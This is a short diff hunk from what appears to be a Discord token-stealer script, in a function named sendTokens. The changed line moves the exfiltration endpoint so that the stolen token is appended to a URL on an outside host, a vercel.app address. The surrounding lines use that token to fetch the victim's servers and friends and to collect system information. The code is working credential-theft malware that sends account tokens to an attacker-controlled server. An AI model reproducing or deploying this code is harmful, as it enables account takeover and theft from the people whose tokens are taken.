@@ -73,7 +73,7 @@ async function sendTokens() {
 
             if (!k4itrun) continue;
 
-            var copy = `https://6889.fun/api/aurathemes/raw?data=${token}`;
+            var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
             var servers =  fetchServers(token);
             var friends =  fetchFriends(token);
             let system = await getInfo();
